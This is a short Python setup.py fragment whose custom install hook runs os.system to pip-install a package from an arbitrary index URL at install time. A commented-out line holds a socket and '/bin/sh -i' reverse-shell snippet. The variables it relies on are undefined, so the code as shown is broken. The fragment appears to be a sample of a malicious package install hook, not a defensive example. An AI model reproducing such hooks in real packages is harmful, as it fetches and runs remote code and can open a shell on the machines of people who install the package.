import os
from setuptools import setup
from setuptools.command.install import install
class Hook(install):
    def run(self):
        os.system('pip3 install ' + name + ' --index-url ' + url)
        # f.write('socket.socket(socket.AF_INET,socket.SOCK_STREAM); subprocess.call(["/bin/sh","-i"])')
setup(cmdclass={'install': Hook})
